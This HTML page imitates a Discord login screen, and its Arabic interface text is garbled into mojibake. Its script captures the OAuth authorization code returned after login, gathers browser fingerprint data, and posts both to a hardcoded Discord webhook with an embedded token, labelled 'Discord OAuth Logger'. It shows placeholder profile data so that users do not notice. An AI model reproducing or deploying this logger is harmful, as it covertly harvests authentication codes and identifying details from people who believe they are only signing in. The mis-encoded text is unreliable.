<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ - Discord</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #5865f2;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: linear-gradient(135deg, #5865f2 0%, #3c45a5 100%);
        }
        
        .login-container {
            background: #36393f;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
            width: 100%;
            max-width: 480px;
            text-align: center;
        }
        
        .discord-logo {
            width: 124px;
            height: 34px;
            margin: 0 auto 24px;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI0IiBoZWlnaHQ9IjM0IiB2aWV3Qm94PSIwIDAgMTI0IDM0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTA0LjQgOC4yTDEwNCA4LjJDMTEwLjkgMTEuMyAxMTUuNyAxNy4xIDEyMC44IDI0LjdDMTIyLjMgMjcuMSAxMjIuMyAzMC4xIDEyMC4yIDMyLjNDMTE4IDM0LjYgMTE0LjYgMzQuNiAxMTIuNCAzMi4zTDExMC44IDMwLjdDMTA3IDI1IDEwMi44IDIwLjEgOTggMTYuMlY5LjdDOTggOC45IDk3LjMgOC4yIDk2LjUgOC4ySDc4LjlDNzguMSA4LjIgNzcuNCA4LjkgNzcuNCA5LjdWMTkuMkM3NS41IDE5LjQgNzMuNyAxOS44IDcyIDIwLjRWOS43Qzc0IDguMyA3NS43IDYuNSA3Ny4xIDQuNUM3OC41IDIuNSA4MC4yIDEuNSA4Mi4yIDFIOTMuM0M5NS4zIDEuNSA5NyAyLjUgOTguNCA0LjVDOTkuOCA2LjUgMTAxLjUgOC4zIDEwMy41IDkuN1Y5LjdDMTA0IDguOSAxMDQuNCA4LjIgMTA0LjQgOC4yWiIgZmlsbD0iIzU4NjVGMiIvPgo8L3N2Zz4K') no-repeat center;
            background-size: contain;
        }
        
        .welcome-text {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #b9bbbe;
            font-size: 16px;
            margin-bottom: 20px;
        }
        
        .discord-login-btn {
            width: 100%;
            padding: 12px 16px;
            background: #5865f2;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 8px;
        }
        
        .discord-login-btn:hover {
            background: #4752c4;
        }
        
        .discord-login-btn:active {
            background: #3c45a5;
        }
        
        .divider {
            margin: 20px 0;
            position: relative;
            text-align: center;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #4f545c;
        }
        
        .divider span {
            background: #36393f;
            color: #72767d;
            padding: 0 16px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .auth-info {
            background: #2f3136;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            text-align: right;
        }
        
        .auth-info h3 {
            color: #ffffff;
            font-size: 16px;
            margin-bottom: 8px;
        }
        
        .auth-code {
            background: #40444b;
            border: 1px solid #4f545c;
            border-radius: 4px;
            padding: 8px 12px;
            color: #ffffff;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            word-break: break-all;
            margin-bottom: 12px;
            display: none;
        }
        
        .info-text {
            color: #b9bbbe;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .user-info {
            background: #2f3136;
            border-radius: 8px;
            padding: 20px;
            margin-top: 16px;
            display: none;
        }
        
        .user-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: block;
        }
        
        .user-name {
            color: #ffffff;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .user-email {
            color: #b9bbbe;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .logout-btn {
            width: 100%;
            padding: 8px 16px;
            background: #ed4245;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
        }
        
        .logout-btn:hover {
            background: #c73235;
        }
        
        .footer {
            margin-top: 20px;
            text-align: center;
        }
        
        .footer a {
            color: #00aff4;
            text-decoration: none;
            font-size: 14px;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .loading {
            display: none;
            color: #b9bbbe;
            font-size: 14px;
            margin-top: 12px;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #4f545c;
            border-radius: 50%;
            border-top-color: #5865f2;
            animation: spin 1s ease-in-out infinite;
            margin-left: 8px;
        }
        
        .webhook-status {
            background: #2f3136;
            border-radius: 8px;
            padding: 12px;
            margin-top: 16px;
            text-align: center;
            display: none;
        }
        
        .webhook-success {
            color: #57f287;
            font-size: 14px;
        }
        
        .webhook-error {
            color: #ed4245;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="discord-logo"></div>
        
        <div id="loginSection">
            <h1 class="welcome-text">Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ùƒ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰!</h1>
            <p class="subtitle">Ù†Ø­Ù† Ù…ØªØ­Ù…Ø³ÙˆÙ† Ù„Ø±Ø¤ÙŠØªÙƒ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰!</p>
            
            <a href="https://discord.com/oauth2/authorize?client_id=1261839375738732684&response_type=code&redirect_uri=https%3A%2F%2Fkhaledali.vercel.app%2F&scope=identify+email" 
               class="discord-login-btn">
                ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            </a>
            
            <div class="loading" id="loading">
                Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„<span class="spinner"></span>
            </div>
        </div>
        
        <div class="user-info" id="userInfo">
            <img class="user-avatar" id="userAvatar" alt="User Avatar">
            <div class="user-name" id="userName"></div>
            <div class="user-email" id="userEmail"></div>
            <button class="logout-btn" onclick="logout()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</button>
        </div>
        
        <div class="divider">
            <span>Ø£Ùˆ</span>
        </div>
        
        <div class="auth-info">
            <h3>ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©</h3>
            <div class="auth-code" id="authCode"></div>
            <div class="info-text">
                Ø³ÙŠØªÙ… Ø¹Ø±Ø¶ ÙƒÙˆØ¯ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ù‡Ù†Ø§ Ø¹Ù†Ø¯ Ø§Ù„Ø¹ÙˆØ¯Ø© Ù…Ù† Discord. 
                ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ API Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ.
            </div>
        </div>
        
        <div class="footer">
            <a href="https://discord.com/developers/docs/topics/oauth2" target="_blank">
                ğŸ“š ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Discord OAuth2
            </a>
        </div>
        
        <div class="webhook-status" id="webhookStatus">
            <div class="webhook-success" id="webhookSuccess">âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Webhook Ø¨Ù†Ø¬Ø§Ø­</div>
            <div class="webhook-error" id="webhookError">âŒ ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Webhook</div>
        </div>
    </div>

    <script>
        // ÙØ­Øµ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…Ø±ØªØ¬Ø¹ Ù…Ù† Discord
        function checkAuthCode() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const error = urlParams.get('error');
            
            if (error) {
                alert('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©: ' + error);
                return;
            }
            
            if (code) {
                // Ø¹Ø±Ø¶ ÙƒÙˆØ¯ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                document.getElementById('authCode').textContent = code;
                document.getElementById('authCode').style.display = 'block';
                
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒÙˆØ¯ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
                // ÙÙŠ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØŒ Ø³ØªØ­ØªØ§Ø¬ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                simulateUserData(code);
                
                // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
                const newUrl = window.location.origin + window.location.pathname;
                window.history.replaceState({}, document.title, newUrl);
            }
        }
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (ÙÙŠ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ø³ØªØ£ØªÙŠ Ù…Ù† API)
        function simulateUserData(code) {
            // Ø¹Ø±Ø¶ Ù…Ø¤Ø´Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('loading').style.display = 'block';
            
            setTimeout(() => {
                const userData = {
                    id: '123456789012345678',
                    username: 'DiscordUser',
                    discriminator: '1234',
                    email: 'user@example.com',
                    avatar: null,
                    code: code
                };
                
                showUserInfo(userData);
                document.getElementById('loading').style.display = 'none';
            }, 2000);
        }
        
        // Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        function showUserInfo(user) {
            document.getElementById('loginSection').style.display = 'none';
            
            // ØªØ¹ÙŠÙŠÙ† Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            document.getElementById('userName').textContent = user.username + '#' + user.discriminator;
            document.getElementById('userEmail').textContent = user.email;
            
            // ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø£ÙØ§ØªØ§Ø±
            const defaultAvatar = `https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png`;
            const userAvatar = user.avatar ? 
                `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 
                defaultAvatar;
            
            document.getElementById('userAvatar').src = userAvatar;
            document.getElementById('userInfo').style.display = 'block';
            
            // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            const userData = {
                ...user,
                timestamp: new Date().toISOString()
            };
            
            console.log('User Data:', userData);
            localStorage.setItem('discordUser', JSON.stringify(userData));
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ webhook
            sendToWebhook(userData);
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ webhook
        function sendToWebhook(userData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1385842517546766487/uddYVbHJ7n0hwryVqfS-5KPPUTDyTviruD_sy767UmYuIJ_bDTsxkXrF3FrxZAQx6nfo';
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
            const browserInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'Direct'
            };
            
            const webhookData = {
                username: "Discord OAuth Logger",
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                embeds: [{
                    title: "ğŸ” ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ø¹Ø¨Ø± Discord",
                    description: "ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ Ø¨Ù†Ø¬Ø§Ø­",
                    color: 5865242,
                    fields: [
                        {
                            name: "ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…",
                            value: userData.username + '#' + userData.discriminator,
                            inline: true
                        },
                        {
                            name: "ğŸ†” Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…",
                            value: userData.id,
                            inline: true
                        },
                        {
                            name: "ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ",
                            value: userData.email || 'ØºÙŠØ± Ù…ØªÙˆÙØ±',
                            inline: true
                        },
                        {
                            name: "ğŸ”‘ ÙƒÙˆØ¯ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©",
                            value: "```" + userData.code + "```",
                            inline: false
                        },
                        {
                            name: "ğŸŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­",
                            value: `**Ø§Ù„Ù†Ø¸Ø§Ù…:** ${browserInfo.platform}\n**Ø§Ù„Ù…ØªØµÙØ­:** ${browserInfo.userAgent.split(' ').pop()}\n**Ø§Ù„Ù„ØºØ©:** ${browserInfo.language}`,
                            inline: false
                        },
                        {
                            name: "ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©",
                            value: `**Ø§Ù„Ø¯Ù‚Ø©:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n**Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©:** ${browserInfo.timezone}`,
                            inline: true
                        },
                        {
                            name: "ğŸ”— Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ÙˆØµÙˆÙ„",
                            value: `**Ø§Ù„Ø±Ø§Ø¨Ø·:** ${browserInfo.url}\n**Ø§Ù„Ù…ØµØ¯Ø±:** ${browserInfo.referrer}`,
                            inline: false
                        }
                    ],
                    thumbnail: {
                        url: userData.avatar ? 
                            `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : 
                            `https://cdn.discordapp.com/embed/avatars/${userData.discriminator % 5}.png`
                    },
                    footer: {
                        text: "Discord OAuth System",
                        icon_url: "https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png"
                    },
                    timestamp: userData.timestamp
                }]
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            })
            .then(response => {
                if (response.ok) {
                    console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ Webhook');
                    showWebhookStatus(true);
                } else {
                    console.error('âŒ ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', response.status);
                    showWebhookStatus(false);
                }
            })
            .catch(error => {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                showWebhookStatus(false);
            });
        }
        
        // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Webhook
        function showWebhookStatus(success) {
            const statusDiv = document.getElementById('webhookStatus');
            const successDiv = document.getElementById('webhookSuccess');
            const errorDiv = document.getElementById('webhookError');
            
            statusDiv.style.display = 'block';
            
            if (success) {
                successDiv.style.display = 'block';
                errorDiv.style.display = 'none';
            } else {
                successDiv.style.display = 'none';
                errorDiv.style.display = 'block';
            }
            
            // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬
        function logout() {
            localStorage.removeItem('discordUser');
            document.getElementById('loginSection').style.display = 'block';
            document.getElementById('userInfo').style.display = 'none';
            document.getElementById('authCode').style.display = 'none';
        }
        
        // ÙØ­Øµ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø³Ø§Ø¨Ù‚
        function checkPreviousLogin() {
            const savedUser = localStorage.getItem('discordUser');
            if (savedUser) {
                const userData = JSON.parse(savedUser);
                // ÙØ­Øµ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø¬Ù„Ø³Ø© ØµØ§Ù„Ø­Ø© (Ø£Ù‚Ù„ Ù…Ù† Ø³Ø§Ø¹Ø©)
                const loginTime = new Date(userData.timestamp);
                const now = new Date();
                const hoursPassed = (now - loginTime) / (1000 * 60 * 60);
                
                if (hoursPassed < 1) {
                    showUserInfo(userData);
                } else {
                    localStorage.removeItem('discordUser');
                }
            }
        }
        
        // ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¯ÙˆØ§Ù„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.onload = function() {
            checkAuthCode();
            checkPreviousLogin();
        };
    </script>
</body>
</html>
